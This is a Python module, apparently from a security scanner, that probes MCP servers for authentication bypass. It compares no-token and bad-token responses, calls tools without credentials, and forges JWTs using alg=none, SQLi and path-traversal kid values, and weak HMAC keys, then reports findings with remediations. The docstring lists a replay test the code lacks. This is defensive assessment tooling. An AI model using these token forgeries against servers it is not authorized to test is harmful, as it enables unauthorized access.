"""
Authentication / Authorization Bypass (Pro).

Layered tests:

  1. Auth/no-auth/bad-token differential — does the server enforce auth?
  2. Token-oracle leakage — does the server reveal the failure reason?
  3. Per-tool authorization — when transport-level auth holds, does
     every tool also reject the unauthenticated client?
  4. JWT structural attacks — for bearer auth, audit the token:
       a. alg=none           — server accepts unsigned tokens
       b. kid SQL injection  — `kid` parameter as SQLi sink
       c. weak HMAC          — try a list of weak symmetric keys
  5. Bearer-token replay — try the legitimate token from a different
     X-Forwarded-For / X-Real-IP, see if origin enforcement is missing.

Requires that the Target has ``auth_config`` set (legitimate creds).
"""

import base64 as _b64
import hashlib as _hashlib
import hmac as _hmac
import json as _json


def _normalize_auth(raw):
    if isinstance(raw, dict):
        return raw
    if isinstance(raw, str) and raw.strip():
        try:
            parsed = _json.loads(raw)
            return parsed if isinstance(parsed, dict) else {}
        except Exception:
            return {}
    return {}


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "authentication_bypass"),
        target=target,
    )
    timeout = int(params.get("timeout", 20))
    test_tool_call = bool(params.get("test_tool_call", True))
    test_jwt_alg_none = bool(params.get("test_jwt_alg_none", True))
    test_jwt_kid_sqli = bool(params.get("test_jwt_kid_sqli", True))
    test_jwt_weak_hmac = bool(params.get("test_jwt_weak_hmac", True))
    weak_hmac_keys = params.get("weak_hmac_keys") or [
        "secret", "password", "key", "changeme", "123456",
        "admin", "test", "default", "your-256-bit-secret",
    ]
    max_tools_to_probe = int(params.get("max_tools_to_probe", 10))
    protocol_version = params.get("protocol_version") or None
    transport_override = params.get("transport_override") or None

    legit_auth = _normalize_auth(target.get("auth_config"))
    auth_type = (legit_auth.get("type") or "none").lower()
    if not legit_auth or auth_type == "none":
        rb.warn("Target has no auth_config — running as bare reachability test.")

    # --- 1. Authenticated baseline ---------------------------------------
    rb.info("Baseline: authenticated initialize")
    client_ok = mcp_client.MCPClient.from_target(
        target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        ok_init = client_ok.initialize()
        rb.add_evidence(evidence.ev_mcp_call(ok_init, note="authenticated initialize"))
        ok_tl = client_ok.tools_list() if ok_init.get("ok") else None
        if ok_tl:
            rb.add_evidence(evidence.ev_mcp_call(ok_tl, note="authenticated tools/list"))
    finally:
        client_ok.close()
    auth_success = bool(ok_init.get("ok"))

    # --- 2. No-auth probe -------------------------------------------------
    noauth_target = dict(target); noauth_target["auth_config"] = {"type": "none"}
    client_no = mcp_client.MCPClient.from_target(
        noauth_target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        no_init = client_no.initialize()
        rb.add_evidence(evidence.ev_mcp_call(no_init, note="no-auth initialize"))
    finally:
        client_no.close()

    if no_init.get("ok") and auth_type != "none":
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "authentication_bypass"),
            title="MCP server allows initialize without credentials",
            category="authentication_bypass",
            severity="critical", confidence="confirmed",
            cwe="CWE-306",
            description=("Server completed MCP initialize without credentials."),
            impact="Full unauthenticated access to MCP surface.",
            remediation=("Require auth at the MCP endpoint. Reject requests "
                         "missing Authorization headers before JSON-RPC parse."),
            evidence=[evidence.ev_mcp_call(no_init)],
        ))

    # --- 3. Bad-bearer probe ---------------------------------------------
    bad_target = dict(target)
    bad_target["auth_config"] = {"type": "bearer", "token": "invalid-" + "A" * 32}
    client_bad = mcp_client.MCPClient.from_target(
        bad_target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        bad_init = client_bad.initialize()
        rb.add_evidence(evidence.ev_mcp_call(bad_init, note="invalid-bearer initialize"))
    finally:
        client_bad.close()

    if bad_init.get("ok"):
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "authentication_bypass"),
            title="MCP server accepts arbitrary bearer tokens",
            category="authentication_bypass",
            severity="critical", confidence="confirmed",
            cwe="CWE-287",
            description=("Server accepted a syntactically-valid but random bearer "
                         "token. Validation missing or insufficient."),
            remediation=("Verify JWT signatures, check iss/aud/exp, reject "
                         "unknown tokens with 401."),
        ))

    # --- 4. Token oracle (different errors for no-token vs bad-token) ----
    if not bad_init.get("ok") and not no_init.get("ok"):
        a_status, a_body = no_init.get("status"), str(no_init.get("response"))
        b_status, b_body = bad_init.get("status"), str(bad_init.get("response"))
        if a_status != b_status or _significant_diff(a_body, b_body):
            rb.add_finding(evidence.Finding(
                attack_id=context.get("attack_id", "authentication_bypass"),
                title="Authentication oracle (no-token vs bad-token errors differ)",
                category="authentication_bypass",
                severity="low", confidence="high",
                cwe="CWE-204",
                description=(
                    "Different status / body for `no token` vs `random token` "
                    "lets attackers programmatically distinguish missing-token "
                    "from invalid-token failures, accelerating credential stuffing."
                ),
                remediation="Return identical 401 responses regardless of cause.",
                evidence=[evidence.ev_mcp_call(no_init, note="no-token"),
                          evidence.ev_mcp_call(bad_init, note="bad-token")],
            ))

    # --- 5. Per-tool authorization ---------------------------------------
    if auth_success and ok_tl and test_tool_call:
        tools = (ok_tl.get("result") or {}).get("tools") or []
        client_no2 = mcp_client.MCPClient.from_target(
            noauth_target, timeout=timeout,
            protocol_version=protocol_version,
            force_transport=transport_override,
        )
        try:
            client_no2.initialize()
            for tool in tools[:max_tools_to_probe]:
                name = tool.get("name")
                if not name:
                    continue
                args = helpers.fill_defaults(tool.get("inputSchema") or {})
                r = client_no2.call_tool_safe(name, args)
                if r.get("ok") and not r.get("is_error"):
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id", "authentication_bypass"),
                        title=f"Tool '{name}' callable without authentication",
                        category="authentication_bypass",
                        severity="high", confidence="confirmed",
                        cwe="CWE-862",
                        tool=name,
                        description=("Authenticated and unauthenticated calls "
                                     "both succeeded — auth enforced at transport "
                                     "but missing per-tool."),
                        remediation="Authorize per tool, not just per transport.",
                        evidence=[evidence.ev_mcp_call(r)],
                    ))
        finally:
            client_no2.close()

    # --- 6. JWT structural attacks --------------------------------------
    if auth_type in ("bearer", "oauth2", "jwt") and legit_auth.get("token"):
        token = legit_auth.get("token") or ""
        decoded = secret_validators.decode_jwt(token)
        rb.add_evidence(evidence.ev_raw("legit JWT decoded", decoded))

        if test_jwt_alg_none and "header" in decoded:
            forged = _forge_alg_none(decoded["payload"])
            altered = dict(target)
            altered["auth_config"] = {"type": "bearer", "token": forged}
            mc = mcp_client.MCPClient.from_target(
                altered, timeout=timeout,
                protocol_version=protocol_version,
                force_transport=transport_override,
            )
            try:
                r = mc.initialize()
                rb.add_evidence(evidence.ev_mcp_call(r, note="JWT alg=none"))
                if r.get("ok"):
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id", "authentication_bypass"),
                        title="JWT alg=none accepted (signature stripped)",
                        category="authentication_bypass",
                        severity="critical", confidence="confirmed",
                        cwe="CWE-347",
                        description=("Server validated a JWT whose `alg` is "
                                     "`none`. Any attacker can forge tokens "
                                     "for arbitrary subjects without a key."),
                        remediation=("Pin allowed algs server-side. Reject "
                                     "alg=none with 401."),
                        payload=forged,
                    ))
            finally:
                mc.close()

        if test_jwt_kid_sqli and decoded.get("header"):
            kid_payload = decoded["payload"]
            for sql in ("' OR '1'='1", "1' UNION SELECT NULL--",
                        "../../../../dev/null"):
                forged = _forge_with_kid(kid_payload, sql)
                altered = dict(target)
                altered["auth_config"] = {"type": "bearer", "token": forged}
                mc = mcp_client.MCPClient.from_target(
                    altered, timeout=timeout,
                    protocol_version=protocol_version,
                    force_transport=transport_override,
                )
                try:
                    r = mc.initialize()
                    rb.add_evidence(evidence.ev_mcp_call(
                        r, note=f"JWT kid {sql!r}"))
                    if r.get("ok"):
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "authentication_bypass"),
                            title=f"JWT kid SQLi / path-traversal accepted: {sql!r}",
                            category="authentication_bypass",
                            severity="critical", confidence="confirmed",
                            cwe="CWE-89",
                            description=("Server accepted a JWT whose `kid` "
                                         f"header contained `{sql}`. The kid "
                                         "lookup is concatenating into SQL or "
                                         "filesystem path."),
                            remediation=("Validate kid against an allow-list. "
                                         "Use parameterised queries / strict "
                                         "key-id format."),
                            payload=forged,
                        ))
                finally:
                    mc.close()

        if test_jwt_weak_hmac and decoded.get("alg", "").startswith("HS"):
            for key in weak_hmac_keys:
                if _verify_hs256(token, key):
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id", "authentication_bypass"),
                        title=f"JWT signed with weak HMAC key '{key}'",
                        category="authentication_bypass",
                        severity="critical", confidence="confirmed",
                        cwe="CWE-326",
                        description=(f"The legitimate token verifies under "
                                     f"the trivial key '{key}'. Attackers can "
                                     "forge any JWT for this issuer."),
                        remediation=("Use a strong random key (≥256 bits) or "
                                     "asymmetric (RS256/ES256). Rotate."),
                        payload=key,
                    ))
                    break

    return rb.finalize()


# ---------------------------------------------------------------------------
# JWT helpers
# ---------------------------------------------------------------------------

def _b64url(b: bytes) -> str:
    return _b64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _forge_alg_none(payload: dict) -> str:
    h = _b64url(_json.dumps({"alg": "none", "typ": "JWT"}).encode())
    p = _b64url(_json.dumps(payload).encode())
    return f"{h}.{p}."


def _forge_with_kid(payload: dict, kid_value: str) -> str:
    h = _b64url(_json.dumps({"alg": "HS256", "typ": "JWT",
                              "kid": kid_value}).encode())
    p = _b64url(_json.dumps(payload).encode())
    # Sign with empty key — many servers will look up a key via kid SQLi
    # *before* verifying signature, so the sig value is often irrelevant.
    sig = _b64url(_hmac.new(b"", f"{h}.{p}".encode(),
                              _hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


def _verify_hs256(token: str, key: str) -> bool:
    try:
        h, p, s = token.split(".")
        expected = _b64.urlsafe_b64encode(
            _hmac.new(key.encode(), f"{h}.{p}".encode(),
                      _hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        return _hmac.compare_digest(expected, s)
    except Exception:
        return False


def _significant_diff(a: str, b: str) -> bool:
    """Compare two error bodies after normalising request IDs / timestamps."""
    import re as _re
    norm = lambda s: _re.sub(r"[0-9a-f]{8,}|\d{2,}", "X",
                              (s or "").lower())[:400]
    return norm(a) != norm(b)
